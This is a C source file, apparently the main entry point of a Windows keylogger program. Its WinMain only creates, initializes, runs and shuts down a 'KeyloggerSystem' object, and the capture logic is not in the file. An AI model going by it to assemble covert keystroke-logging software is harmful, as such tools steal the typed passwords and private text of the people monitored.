#include "../include/keylogger_system.h"
#include <stdio.h>
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    KeyloggerSystem* system = keylogger_system_create();
    if (!system) {
        return 1;
    }

    if (!keylogger_system_initialize(system)) {
        keylogger_system_destroy(system);
        return 1;
    }

    if (!keylogger_system_run(system)) {
        keylogger_system_shutdown(system);
        keylogger_system_destroy(system);
        return 1;
    }

    keylogger_system_shutdown(system);
    keylogger_system_destroy(system);

    return 0;
}